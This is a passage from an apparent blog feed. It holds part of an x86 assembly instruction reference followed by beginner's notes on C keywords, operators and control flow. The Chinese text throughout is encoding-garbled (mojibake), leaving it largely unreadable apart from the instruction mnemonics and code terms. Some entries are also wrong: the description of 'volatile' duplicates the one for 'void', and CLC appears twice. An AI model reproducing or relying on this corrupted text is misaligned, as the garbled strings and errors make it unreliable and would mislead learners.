<p>CWDï¼š å­—è½¬æ¢ä¸ºåŒå­—ã€‚ï¼ˆæŠŠAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°DXä¸­å»ï¼‰</p>
<p>CWDEï¼šåŒå­—è½¬æ¢ä¸ºå››å­—ã€‚ ï¼ˆæŠŠAXä¸­çš„å­—ç¬¦å·æ‰©å±•åˆ°EAXä¸­å»ï¼‰</p>
<p>CDQï¼š åŒ<a href="https://baike.baidu.com/item/%E5%AD%97%E6%89%A9%E5%B1%95">å­—æ‰©å±•</a>ã€‚ï¼ˆæŠŠEAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°EDXä¸­å»ï¼‰</p>
<h2 id="é€»è¾‘è¿ç®—ç±»æŒ‡ä»¤"><a href="#é€»è¾‘è¿ç®—ç±»æŒ‡ä»¤" class="headerlink" title="é€»è¾‘è¿ç®—ç±»æŒ‡ä»¤"></a>é€»è¾‘è¿ç®—ç±»æŒ‡ä»¤</h2><p>é€»è¾‘è¿ç®—ç±»æŒ‡ä»¤åˆ†ä¸ºé€»è¾‘è¿ç®—æŒ‡ä»¤å’Œç§»ä½æŒ‡ä»¤ä¸¤å¤§ç±»ã€‚</p>
<h3 id="é€»è¾‘è¿ç®—æŒ‡ä»¤"><a href="#é€»è¾‘è¿ç®—æŒ‡ä»¤" class="headerlink" title="é€»è¾‘è¿ç®—æŒ‡ä»¤"></a>é€»è¾‘è¿ç®—æŒ‡ä»¤</h3><p>ANDï¼š ä¸è¿ç®—ã€‚</p>
<p>ORï¼š æˆ–è¿ç®—ã€‚</p>
<p>XORï¼š å¼‚æˆ–è¿ç®—ã€‚</p>
<p>NOTï¼š å–åã€‚</p>
<p>TESTï¼š æµ‹è¯•ã€‚ï¼ˆä¸¤æ“ä½œæ•°ä½œä¸è¿ç®—ï¼Œä»…ä¿®æ”¹æ ‡å¿—ä½ï¼Œä¸å›é€ç»“æœï¼‰</p>
<h3 id="ç§»ä½æŒ‡ä»¤"><a href="#ç§»ä½æŒ‡ä»¤" class="headerlink" title="ç§»ä½æŒ‡ä»¤"></a>ç§»ä½æŒ‡ä»¤</h3><p>SHLï¼š é€»è¾‘å·¦ç§»ã€‚</p>
<p>SALï¼š ç®—æœ¯å·¦ç§»ã€‚(=SHL)</p>
<p>SHRï¼š é€»è¾‘å³ç§»ã€‚ï¼ˆæ¯ä½å³ç§»ï¼Œä½ä½è¿› CFï¼Œé«˜ä½è¡¥ 0ï¼‰</p>
<p>SARï¼š ç®—æœ¯å³ç§»ã€‚ï¼ˆæ¯ä½å³ç§»ï¼Œ ä½ä½è¿› CFï¼Œé«˜ä½ä¸å˜ï¼‰</p>
<p>ROLï¼š å¾ªç¯å·¦ç§»ã€‚</p>
<p>RORï¼š å¾ªç¯å³ç§»ã€‚</p>
<p>RCLï¼š é€šè¿‡è¿›ä½çš„å¾ªç¯å·¦ç§»ã€‚</p>
<p>RCRï¼š é€šè¿‡è¿›ä½çš„å¾ªç¯å³ç§»ã€‚</p>
<p>ä»¥ä¸Šå…«ç§ç§»ä½æŒ‡ä»¤ï¼Œå…¶ç§»ä½æ¬¡æ•°å¯è¾¾255æ¬¡ã€‚</p>
<p>ç§»ä½ä¸€æ¬¡æ—¶ï¼Œå¯ç›´æ¥ç”¨<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%A0%81">æ“ä½œç </a>ï¼Œå¦‚ï¼šSHL AXï¼Œ1ï¼›ç§»ä½&gt;1æ¬¡æ—¶ï¼Œåˆ™ç”±å¯„å­˜å™¨CLç»™å‡ºç§»ä½æ¬¡æ•°ï¼Œå¦‚ï¼šMOV CLï¼Œ04ï¼›SHL AXï¼ŒCLã€‚</p>
<h2 id="ä¸²æ“ä½œæŒ‡ä»¤"><a href="#ä¸²æ“ä½œæŒ‡ä»¤" class="headerlink" title="ä¸²æ“ä½œæŒ‡ä»¤"></a>ä¸²æ“ä½œæŒ‡ä»¤</h2><p>ä¸²æ“ä½œæŒ‡ä»¤ç”¨äºå¤„ç†å­˜æ”¾åœ¨å­˜å‚¨å™¨ä¸­çš„æ•°æ®ä¸²ï¼Œæœ‰ä¸²ä¼ é€ã€ä¸²æ¯”è¾ƒã€ä¸²æ‰«æã€ä¸²è£…å…¥ã€ä¸²å­˜å‚¨ã€‚å…¶ä¸­ï¼Œä»…æœ‰ä¸²æ¯”è¾ƒå’Œä¸²æ‰«ææŒ‡ä»¤å¯¹æ ‡å¿—ä½OFã€SFã€ZFã€AFã€PFã€CFæœ‰å½±å“ã€‚ [4] </p>
<p>DSï¼šSI â€”â€”æºä¸²<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">æ®µå¯„å­˜å™¨</a>ï¼šæºä¸²<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">å˜å€</a>ã€‚</p>
<p>ESï¼šDI â€”â€”ç›®æ ‡ä¸²<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">æ®µå¯„å­˜å™¨</a>ï¼šç›®æ ‡ä¸²<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">å˜å€</a>ã€‚</p>
<p>CXï¼š é‡å¤æ¬¡æ•°è®¡æ•°å™¨ã€‚</p>
<p>AL/AXï¼š æ‰«æå€¼ã€‚</p>
<p>Dæ ‡å¿—ï¼š 0è¡¨ç¤ºé‡å¤æ“ä½œä¸­SIå’ŒDIåº”è‡ªåŠ¨å¢é‡ï¼›1è¡¨ç¤ºåº”è‡ªåŠ¨å‡é‡ã€‚</p>
<p>Zæ ‡å¿—ï¼š ç”¨æ¥æ§åˆ¶æ‰«ææˆ–æ¯”è¾ƒæ“ä½œçš„ç»“æŸã€‚</p>
<p>MOVSï¼š ä¸²ä¼ é€ã€‚ï¼ˆMOVSB ä¼ é€å­—ç¬¦ï¼Œ MOVSW ä¼ é€å­—ï¼Œ MOVSD ä¼ é€åŒå­—ï¼‰</p>
<p>CMPSï¼š ä¸²æ¯”è¾ƒã€‚ï¼ˆCMPSB æ¯”è¾ƒå­—ç¬¦ï¼Œ CMPSW æ¯”è¾ƒå­—ï¼‰</p>
<p>SCASï¼š ä¸²æ‰«æã€‚æŠŠALæˆ–AXçš„å†…å®¹ä¸ç›®æ ‡ä¸²ä½œæ¯”è¾ƒï¼Œæ¯”è¾ƒç»“æœåæ˜ åœ¨æ ‡å¿—ä½ã€‚</p>
<p>LODSï¼š è£…å…¥ä¸²ã€‚æŠŠæºä¸²ä¸­çš„å…ƒç´ ï¼ˆå­—æˆ–å­—èŠ‚ï¼‰é€ä¸€è£…å…¥ALæˆ–AXä¸­ã€‚ï¼ˆ<a href="https://baike.baidu.com/item/LODSB">LODSB</a> ä¼ é€å­—ç¬¦ï¼Œ LODSW ä¼ é€å­—ï¼ŒLODSD ä¼ é€åŒå­—ï¼‰</p>
<p>STOSï¼š ä¿å­˜ä¸²ã€‚æ˜¯LODSçš„é€†è¿‡ç¨‹ã€‚</p>
<p>REPï¼š å½“CX/ECX&lt;&gt;0æ—¶é‡å¤ã€‚</p>
<p>REPE/REPZï¼š å½“ZF=1æˆ–æ¯”è¾ƒç»“æœç›¸ç­‰ï¼Œä¸”CX/ECX&lt;&gt;0æ—¶é‡å¤ã€‚</p>
<p>REPNE/REPNZï¼š å½“ZF=0æˆ–æ¯”è¾ƒç»“æœä¸ç›¸ç­‰ï¼Œä¸”CX/ECX&lt;&gt;0æ—¶é‡å¤ã€‚</p>
<p>REPCï¼š å½“CF=1ä¸”CX/ECX&lt;&gt;0æ—¶é‡å¤ã€‚</p>
<p>REPNCï¼š å½“CF=0ä¸”CX/ECX&lt;&gt;0æ—¶é‡å¤ã€‚ [6] </p>
<h2 id="ç¨‹åºè½¬ç§»æŒ‡ä»¤"><a href="#ç¨‹åºè½¬ç§»æŒ‡ä»¤" class="headerlink" title="ç¨‹åºè½¬ç§»æŒ‡ä»¤"></a>ç¨‹åºè½¬ç§»æŒ‡ä»¤</h2><p>æ§åˆ¶è½¬ç§»ç±»æŒ‡ä»¤åŒ…æ‹¬æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤ã€æ¡ä»¶è½¬ç§»æŒ‡ä»¤ã€å¾ªç¯æ§åˆ¶æŒ‡ä»¤ã€ä¸­æ–­æŒ‡ä»¤ã€å­ç¨‹åºè°ƒç”¨å’Œè¿”å›æŒ‡ä»¤ã€‚ [4] </p>
<h3 id="æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤"><a href="#æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤" class="headerlink" title="æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤"></a>æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤</h3><p>ï¼ˆé•¿è½¬ç§»ï¼‰</p>
<p>JMPï¼š æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤ã€‚</p>
<p>CALLï¼š è¿‡ç¨‹è°ƒç”¨ã€‚callä¼šåšä¸¤ä»¶äº‹æƒ…ï¼Œå…¶ä¸€ï¼Œå°†callæŒ‡ä»¤åé¢çš„ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œæ— æ¡ä»¶è·³è½¬åˆ°callæŒ‡ä»¤è°ƒç”¨å‡½æ•°çš„åœ°å€å¤„ï¼Œå¼€å§‹æ‰§è¡Œå­ç¨‹åºã€‚</p>
<p>RET/RETFï¼š è¿‡ç¨‹è¿”å›ã€‚retæŒ‡ä»¤ï¼Œåˆ™æ‰§è¡ŒcallæŒ‡ä»¤åé¢çš„ä¸€æ¡æŒ‡ä»¤ã€‚</p>
<h3 id="æ¡ä»¶è½¬ç§»æŒ‡ä»¤"><a href="#æ¡ä»¶è½¬ç§»æŒ‡ä»¤" class="headerlink" title="æ¡ä»¶è½¬ç§»æŒ‡ä»¤"></a>æ¡ä»¶è½¬ç§»æŒ‡ä»¤</h3><p>ï¼ˆçŸ­è½¬ç§»ï¼Œ-128åˆ°+127çš„è·ç¦»å†…ï¼›å½“ä¸”ä»…å½“(SFã€XORã€OF)=1æ—¶ï¼ŒOP1&lt;OP2 ï¼‰</p>
<p>JA/JNBEï¼š å¤§äºè½¬ç§»ã€‚</p>
<p>JAE/JNBï¼š å¤§äºæˆ–ç­‰äºè½¬ç§»ã€‚</p>
<p>JB/JNAEï¼š å°äºè½¬ç§»ã€‚</p>
<p>JBE/<a href="https://baike.baidu.com/item/JNA">JNA</a>ï¼š å°äºæˆ–ç­‰äºè½¬ç§»ã€‚</p>
<p>ä»¥ä¸Šå››æ¡ï¼Œæµ‹è¯•<a href="https://baike.baidu.com/item/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0">æ— ç¬¦å·æ•´æ•°</a>è¿ç®—çš„ç»“æœï¼ˆæ ‡å¿—Cå’ŒZï¼‰</p>
<p>JG/JNLEï¼š å¤§äºè½¬ç§»ã€‚</p>
<p>JGE/JNLï¼š å¤§äºæˆ–ç­‰äºè½¬ç§»ã€‚</p>
<p>JL/JNGEï¼š å°äºè½¬ç§»ã€‚</p>
<p><a href="https://baike.baidu.com/item/JLE">JLE</a>/JNGï¼š å°äºæˆ–ç­‰äºè½¬ç§»ã€‚</p>
<p>ä»¥ä¸Šå››æ¡ï¼Œæµ‹è¯•å¸¦ç¬¦å·æ•´æ•°è¿ç®—çš„ç»“æœï¼ˆæ ‡å¿—Sï¼ŒOå’ŒZï¼‰</p>
<p>JE/JZï¼š ç­‰äºè½¬ç§»ã€‚</p>
<p>JNE/JNZï¼š ä¸ç­‰äºæ—¶è½¬ç§»ã€‚</p>
<p>JCï¼š æœ‰è¿›ä½æ—¶è½¬ç§»ã€‚</p>
<p>JNCï¼š æ— è¿›ä½æ—¶è½¬ç§»ã€‚</p>
<p>JNOï¼š ä¸æº¢å‡ºæ—¶è½¬ç§»ã€‚</p>
<p>JNP/JPOï¼š å¥‡å¶æ€§ä¸ºå¥‡æ•°æ—¶è½¬ç§»ã€‚</p>
<p>JNSï¼š ç¬¦å·ä½ä¸º â€œ0â€ æ—¶è½¬ç§»ã€‚</p>
<p>JOï¼š æº¢å‡ºè½¬ç§»ã€‚</p>
<p>JP/JPEï¼š å¥‡å¶æ€§ä¸ºå¶æ•°æ—¶è½¬ç§»ã€‚</p>
<p>JSï¼š ç¬¦å·ä½ä¸º â€œ1â€ æ—¶è½¬ç§»ã€‚ [6] </p>
<h3 id="å¾ªç¯æ§åˆ¶æŒ‡ä»¤"><a href="#å¾ªç¯æ§åˆ¶æŒ‡ä»¤" class="headerlink" title="å¾ªç¯æ§åˆ¶æŒ‡ä»¤"></a>å¾ªç¯æ§åˆ¶æŒ‡ä»¤</h3><p>ï¼ˆçŸ­è½¬ç§»ï¼‰</p>
<p>LOOPï¼š CXä¸ä¸ºé›¶æ—¶å¾ªç¯ã€‚</p>
<p>LOOPE/LOOPZï¼š CXä¸ä¸ºé›¶ä¸”æ ‡å¿—Z=1æ—¶å¾ªç¯ã€‚</p>
<p>LOOPNE/LOOPNZï¼š CXä¸ä¸ºé›¶ä¸”æ ‡å¿—Z=0æ—¶å¾ªç¯ã€‚</p>
<p>JCXZï¼š CXä¸ºé›¶æ—¶è½¬ç§»ã€‚</p>
<p>JECXZï¼š ECXä¸ºé›¶æ—¶è½¬ç§»ã€‚</p>
<h3 id="ä¸­æ–­æŒ‡ä»¤"><a href="#ä¸­æ–­æŒ‡ä»¤" class="headerlink" title="ä¸­æ–­æŒ‡ä»¤"></a>ä¸­æ–­æŒ‡ä»¤</h3><p>INTï¼š <a href="https://baike.baidu.com/item/%E4%B8%AD%E6%96%AD%E6%8C%87%E4%BB%A4">ä¸­æ–­æŒ‡ä»¤</a>ã€‚</p>
<p>INTOï¼š æº¢å‡ºä¸­æ–­ã€‚</p>
<p>IRETï¼š ä¸­æ–­è¿”å›ã€‚</p>
<h2 id="å…¶ä»–æŒ‡ä»¤"><a href="#å…¶ä»–æŒ‡ä»¤" class="headerlink" title="å…¶ä»–æŒ‡ä»¤"></a>å…¶ä»–æŒ‡ä»¤</h2><h3 id="ä¼ªæŒ‡ä»¤"><a href="#ä¼ªæŒ‡ä»¤" class="headerlink" title="ä¼ªæŒ‡ä»¤"></a>ä¼ªæŒ‡ä»¤</h3><p>DBï¼š å®šä¹‰å­—èŠ‚ï¼ˆ1å­—èŠ‚ï¼‰</p>
<p>DWï¼š å®šä¹‰å­—ï¼ˆ2å­—èŠ‚ï¼‰</p>
<p>DDï¼š å®šä¹‰åŒå­—ï¼ˆ4å­—èŠ‚ï¼‰</p>
<p>PROCï¼š å®šä¹‰è¿‡ç¨‹ã€‚</p>
<p>ENDPï¼š è¿‡ç¨‹ç»“æŸã€‚</p>
<p>SEGMENTï¼š å®šä¹‰æ®µã€‚</p>
<p>ASSUMEï¼š å»ºç«‹æ®µ<a href="https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80">å¯„å­˜å™¨å¯»å€</a>ã€‚</p>
<p>ENDSï¼š æ®µç»“æŸã€‚</p>
<p>ENDï¼š ç¨‹åºç»“æŸã€‚</p>
<h3 id="å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤"><a href="#å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤" class="headerlink" title="å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤"></a>å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤</h3><p>å³æ ‡å¿—å¤„ç†æŒ‡ä»¤ï¼Œå¤„ç†æœºæ§åˆ¶æŒ‡ä»¤å®Œæˆç®€å•çš„æ§åˆ¶åŠŸèƒ½ã€‚</p>
<p>CLCï¼š ï¼ˆè¿›ä½ä½ç½®0æŒ‡ä»¤ï¼‰</p>
<p>CMCï¼š ï¼ˆè¿›ä½ä½æ±‚åæŒ‡ä»¤ï¼‰</p>
<p>CLCï¼š ï¼ˆè¿›ä½ä½ç½®ä¸º0æŒ‡ä»¤ï¼‰</p>
<p>STCï¼š ï¼ˆè¿›ä½ä½ç½®ä¸º1æŒ‡ä»¤ï¼‰</p>
<p>CLDï¼š ï¼ˆæ–¹å‘æ ‡å¿—ä½ç½®0æŒ‡ä»¤ï¼‰</p>
<p>STDï¼š ï¼ˆæ–¹å‘æ ‡å¿—ä½ç½®1æŒ‡ä»¤ï¼‰</p>
<p>CLIï¼š ï¼ˆä¸­æ–­æ ‡å¿—ç½®0æŒ‡ä»¤ï¼‰</p>
<p>STIï¼š ï¼ˆä¸­æ–­æ ‡å¿—ç½®1æŒ‡ä»¤ï¼‰</p>
<p>NOPï¼š ï¼ˆæ— æ“ä½œï¼‰</p>
<p>HLTï¼š ï¼ˆåœæœºï¼‰</p>
<p>WAITï¼š ï¼ˆç­‰å¾…ï¼‰</p>
<p>ESCï¼š ï¼ˆæ¢ç ï¼‰</p>
<p>LOCKï¼š ï¼ˆå°é”ï¼‰</p>
]]></content>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆè¯•cè¯­è¨€â€”â€”ç¬”è®°</title>
    <url>/2020/10/02/2020-10-02-%E5%88%9D%E8%AF%95c%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="ä¸€ã€cè¯­è¨€å°è®°"><a href="#ä¸€ã€cè¯­è¨€å°è®°" class="headerlink" title="ä¸€ã€cè¯­è¨€å°è®°"></a>ä¸€ã€cè¯­è¨€å°è®°</h1><h5 id="ç§˜è¯€ï¼šå¤šçœ‹ï¼Œå¤šè¯•ï¼Œå¤šé”™ï¼Œå¤šæƒ³"><a href="#ç§˜è¯€ï¼šå¤šçœ‹ï¼Œå¤šè¯•ï¼Œå¤šé”™ï¼Œå¤šæƒ³" class="headerlink" title="ç§˜è¯€ï¼šå¤šçœ‹ï¼Œå¤šè¯•ï¼Œå¤šé”™ï¼Œå¤šæƒ³"></a>ç§˜è¯€ï¼šå¤šçœ‹ï¼Œå¤šè¯•ï¼Œå¤šé”™ï¼Œå¤šæƒ³</h5><p>1ã€ä½œä¸ºè­¦ç¤ºï¼Œcè¯­è¨€ä¸­éœ€æ³¨æ„ï¼Œæ‰€è¾“å…¥çš„ç¬¦å·å¿…é¡»æ˜¯åœ¨<em><strong>åŠè§’æ¨¡å¼ä¸‹</strong></em>çš„ï¼Œå¦ä¾§å°†å¯¼è‡´è¿è¡Œé”™è¯¯</p>
<p>2ã€åœ¨â€{}â€é‡Œé¢è¾“å…¥çš„è¯­å¥å¤§å¤šè¦ä»¥â€;â€è¿›è¡Œåˆ†éš”ï¼Œè€Œåœ¨â€()â€é‡Œçš„è¯­å¥å¤§å¤šä½¿ç”¨â€,â€åˆ†éš”</p>
<p>3ã€æ·»åŠ ä¸€äº›å…³é”®å­—çš„è¯´æ˜ï¼ˆæ¥ä¸‹æ¥çš„å­¦ä¹ ä¸­éƒ½ä¼šç¢°è§çš„ï¼‰ï¼š</p>
<p><strong>auto//å£°æ˜è‡ªåŠ¨å˜é‡ï¼ˆä¸€èˆ¬å¯çœç•¥ï¼‰</strong></p>
<p> <strong>break//è·³å‡ºå½“å‰å¾ªç¯</strong></p>
<p><strong>case//å¼€å…³è¯­å¥åˆ†æ”¯</strong></p>
<p><strong>char//å£°æ˜å­—ç¬¦å‹å˜é‡æˆ–è€…å‡½æ•°è¿”å›å€¼ç±»å‹</strong></p>
<p><strong>const//å®šä¹‰å¸¸é‡ï¼Œå¦‚æœä¸€ä¸ªå˜é‡è¢«constä¿®é¥°ï¼Œé‚£ä¹ˆä»–çš„å€¼å°±ä¸èƒ½è¢«æ”¹å˜</strong></p>
<p><strong>continue//ç»“æŸå½“å‰å¾ªç¯ï¼Œå¼€å§‹ä¸‹ä¸€è½®å¾ªç¯</strong></p>
<p><strong>default//å¼€å…³è¯­å¥ä¸­çš„â€œå…¶ä»–â€åˆ†æ”¯</strong></p>
<p><strong>do//å¾ªç¯è¯­å¥çš„å¾ªç¯ä½“</strong></p>
<p><strong>double//å£°æ˜åŒç²¾åº¦æµ®ç‚¹å‹å˜é‡æˆ–å‡½æ•°è¿”å›å€¼ç±»å‹</strong></p>
<p>**else//æ¡ä»¶è¯­å¥å¦å®šåˆ†æ”¯ä¸ifè¿ç”¨ **</p>
<p><strong>enum//å£°æ˜æšä¸¾ç±»å‹</strong></p>
<p><strong>extern//å£°æ˜å˜é‡æˆ–è€…å‡½æ•°æ˜¯åœ¨å…¶ä»–æ–‡ä»¶æˆ–è€…æœ¬æ–‡ä»¶çš„å…¶ä»–ä½ç½®å®šä¹‰â€”â€“</strong></p>
<p><strong>float//å£°æ˜æµ®ç‚¹å‹å˜é‡æˆ–è€…å‡½æ•°è¿”å›å€¼ç±»å‹</strong></p>
<p><strong>for//ä¸€ç§å¾ªç¯è¯­å¥</strong></p>
<p><strong>goto//æ— æ¡ä»¶è·³è½¬è¯­å¥</strong></p>
<p><strong>if//æ¡ä»¶è¯­å¥</strong></p>
<p><strong>int//å£°æ˜æ•´æ•°å˜é‡æˆ–å‡½æ•°</strong></p>
<p><strong>long//å£°æ˜é•¿æ•´å‹å˜é‡æˆ–è€…å‡½æ•°è¿”å›å€¼ç±»å‹</strong></p>
<p><strong>register//å£°æ˜å¯„å­˜å™¨å˜é‡â€”â€”â€”</strong></p>
<p><strong>return//å­ç¨‹åºè¿”å›è¯­å¥ï¼ˆå¯ä»¥å¸¦å‚æ•°ï¼Œä¹Ÿå¯ä¸å¸¦å‚æ•°ï¼‰</strong></p>
<p><strong>short//å£°æ˜çŸ­æ•´æ•°å‹å˜é‡æˆ–è€…å‡½æ•°</strong></p>
<p><strong>signed//å£°æ˜æœ‰ç¬¦å·ç±»å‹å˜é‡æˆ–å‡½æ•°</strong></p>
<p><strong>sizeof//è®¡ç®—æ•°æ®ç±»å‹æˆ–è€…å˜é‡é•¿åº¦ï¼ˆå³æ‰€å å­—èŠ‚æ•°ï¼‰</strong></p>
<p><strong>static//å£°æ˜é™æ€å˜é‡â€”â€”â€”</strong></p>
<p><strong>struct//[å£°æ˜ç»“æ„ä½“å˜é‡]â€”â€”â€”</strong></p>
<p><strong>switch//ç”¨äºå¼€å…³è¯­å¥</strong></p>
<p><strong>typedef//ç”¨äºç»™æ•°æ®ç±»å‹å–åˆ«å</strong></p>
<p><strong>unsigned//å£°æ˜æ— ç¬¦å·ç±»å‹å˜é‡æˆ–å‡½æ•°</strong></p>
<p><strong>union//å£°æ˜å…±ç”¨ä½“ç±»å‹â€”â€”â€”-</strong></p>
<p> <strong>void//å£°æ˜å‡½æ•°æ— è¿”å›å€¼æˆ–æ— å‚æ•°ï¼Œå£°æ˜æ— ç±»å‹æŒ‡é’ˆâ€”â€”-</strong></p>
<p><strong>volatile//è¯´æ˜å‡½æ•°æ— è¿”å›å€¼æˆ–æ— å‚æ•°ï¼Œå£°æ˜æ— ç±»å‹æŒ‡é’ˆâ€”â€”-</strong></p>
<p><strong>while//å¾ªç¯è¯­å¥çš„å¾ªç¯æ¡ä»¶</strong></p>
<p>4ã€æ¯è¾“å…¥ä¸€ä¸ªå˜é‡æ—¶ï¼Œéƒ½éœ€åœ¨å‰å¯¹å…¶è¿›è¡Œå£°æ˜ï¼Œè¿™æ­¥æ‰ä¼šä½¿å˜é‡æœ‰æ„ä¹‰ï¼Œå¦ä¾§å°†å¯¼è‡´é”™è¯¯</p>
<p>5ã€è¿›è¡Œç±»å‹è½¬æ¢çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„å­—èŠ‚é—®é¢˜ï¼Œä¸€æ—¦å­—èŠ‚ä¸å¤Ÿï¼Œå°†å¾—åˆ°é”™è¯¯ç»“æœ</p>
<p>6ã€æ³¨æ„ç‚¹ï¼šæ— è®ºå¯¹å“ªä¸ªå˜é‡ï¼Œè¿˜æ˜¯å­—ç¬¦ï¼Œéƒ½å¾—é™„ä¸Šå¯¹å…¶æ˜ç¡®çš„å®šä¹‰ï¼Œåˆå­¦æ—¶å¸¸å¿˜è®°</p>
<p>7ã€å¯¹æŸä¸€å˜é‡å£°æ˜ä»–çš„æ•°æ®ç±»å‹æ—¶ä¸€å®šè¦ä¸€è‡´ï¼Œä¾‹å¦‚ï¼Œå®šä¹‰å˜é‡aä¸ºæ•´å‹æ•°ï¼ˆint aï¼‰ï¼Œç»“æœè®¡ç®—å¼ä¸­a=3.2+6.4=9.6ï¼Œä½†æ­¤æ—¶aå°†åªä¼šè¾“å‡º9è¿™ä¸ªæ•´æ•°</p>
<p>8ã€externå¯ä»¥æ”¾åœ¨å˜é‡æˆ–è€…å‡½æ•°å‰é¢å¼•ç”¨ä¸åœ¨åŒä¸€ä¸ªæ–‡ä»¶é‡Œé¢çš„å˜é‡</p>
<p>9ã€å…¨å±€å˜é‡çš„å®šä¹‰å£°æ˜æ”¾åœ¨é¢„å‘½ä»¤çš„ä¸‹ä¸€è¡Œè¾ƒä¸ºåˆé€‚ï¼Œå¯ä»¥ä½¿å¾—å…¨éƒ¨å‡½æ•°éƒ½èƒ½è°ƒç”¨è¯¥å…¨å±€å˜é‡ï¼ˆå…·ä½“è¿˜æ˜¯çœ‹ä¹ æƒ¯ï¼‰</p>
<p>10ã€è¿ç®—â€œ/â€æ—¶ï¼Œå¦‚æœä¸¤è¾¹éƒ½ä¸ºæ•´æ•°ï¼Œåˆ™ç»“æœä¸ºèˆå»å°æ•°çš„æ•´æ•°éƒ¨åˆ†ï¼Œå¦‚15/4ä¸º3ï¼Œè¦å¾—åˆ°æ­£ç¡®ç­”æ¡ˆï¼Œè¦åƒ15.0/4è¿™æ ·ï¼Œæœ‰ä¸€ä¸ªæ•°ä¸ºæµ®ç‚¹æ•°</p>
<p>11ã€æ±‚ä½™ç¬¦å·â€œ%â€è¦æ±‚åœ¨ç¬¦å·å·¦å³ä¸¤è¾¹éƒ½å¿…é¡»æ˜¯<strong>æ•´æ•°</strong></p>
<p>12ã€èµ‹å€¼è¿ç®—ç¬¦å·¦è¾¹åªèƒ½æ˜¯å•ä¸ªå˜é‡</p>
<p>13ã€è¿ç®—ç¬¦ä¼˜å…ˆçº§åˆ«é«˜ä½ï¼š**!&gt;ç®—æœ¯è¿ç®—ç¬¦&gt;å…³ç³»è¿ç®—ç¬¦&gt;&amp;&amp;&gt;||&gt;èµ‹å€¼è¿ç®—ç¬¦&gt;é€—å·è¿ç®—ç¬¦**</p>
<p>14ã€é€»è¾‘è¿ç®—ç¬¦ä¸€æ—¦ç¡®è®¤äº†é€»è¾‘è¡¨è¾¾å¼çš„å€¼å°±å°†åœæ­¢ï¼Œå¦‚ï¼ˆa=0ï¼‰&amp;&amp;ï¼ˆb=5ï¼‰ï¼Œæ£€éªŒåˆ°aä¸º0ï¼Œå°±ä¼šåœä¸‹ï¼Œä¸ä¼šå»è¿è¡Œb=5ï¼ˆè¡¥å……ï¼šå› ä¸ºåœ¨cè¯­è¨€ä¸­åˆ¤æ–­çœŸå‡ä¾æ®æ˜¯ï¼šé0ä¸ºçœŸï¼Œ0ä¸ºå‡ï¼‰</p>
<p>15ã€~æŒ‰ä½å–åä¸èƒ½ç†è§£ä¸ºæ˜¯å–äº†ä¸€ä¸ªè´Ÿå·ï¼Œå¯ä»¥æƒ³æƒ³æœ‰è´Ÿå·â€œ-â€å°±çŸ¥é“ä¸åº”è¯¥æœ‰ä¸¤ä¸ªç›¸åŒä½œç”¨çš„ç¬¦å·</p>
<p>16ã€è¦è¿ç”¨ä¸åŒçš„å¤´æ–‡ä»¶é‡Œçš„å‡½æ•°çš„æ–¹æ³•å°±æ˜¯åœ¨é¢„å‘½ä»¤ä¸­è¾“å…¥ä½ è¦ç”¨çš„å‡½æ•°æ‰€åœ¨çš„å¤´æ–‡ä»¶</p>
<p>17ã€ç”¨if-elseçš„åµŒå¥—æ ¼å¼åº”ä¸º</p>
<p><strong>ifï¼ˆè¡¨è¾¾å¼1ï¼‰+è¯­å¥1ï¼›</strong></p>
<p><strong>else if ï¼ˆè¡¨è¾¾å¼2ï¼‰+è¯­å¥2Â·Â·Â·Â·Â·Â·</strong></p>
<p>18ã€switch ç»“æ„ï¼šswitchï¼ˆ<strong>æ•´å‹</strong>è¡¨è¾¾å¼ï¼‰ï½›</p>
<p>case <strong>æ•´å‹</strong>å¸¸é‡: è¯­å¥; breakï¼›Â·Â·Â·Â·Â·Â·</p>
<p>default :è¯­å¥ï½</p>
<p>æ³¨ï¼šdefaultå¯ä»¥ä¸å‡ºç°ï¼Œå…¶ä½œç”¨æ˜¯æŒ‡å‘é™¤caseåˆ—ä¸¾çš„æ•°å€¼ä¹‹å¤–çš„æ•°å€¼æ‰§è¡Œå…¶åé¢çš„è¯­å¥</p>
<p>19ã€while(æ¡ä»¶){å¾ªç¯ä½“} ç±»å‹çš„å¾ªç¯è¯­å¥ï¼Œåœ¨æ‹¬å·å†…å¡«å…¥å¾ªç¯è¿è¡Œçš„æ¡ä»¶ï¼ŒèŠ±æ‹¬å·é‡Œé¢å¡«å†™è¦é‡å¤è®¡ç®—çš„å¼å­</p>
<p>20ã€do-whileç±»å‹æ˜¯ å°†ä¼š<strong>å…ˆæ‰§è¡Œä¸€æ¬¡å¾ªç¯ä½“</strong>ï¼Œå†åˆ¤æ–­æ˜¯å¦æ»¡è¶³æ¡ä»¶æ‰§è¡Œä¸‹ä¸€æ¬¡ï¼Œè€Œwhileï¼Œforæ˜¯<strong>å…ˆåˆ¤æ–­å†æ‰§è¡Œ</strong></p>
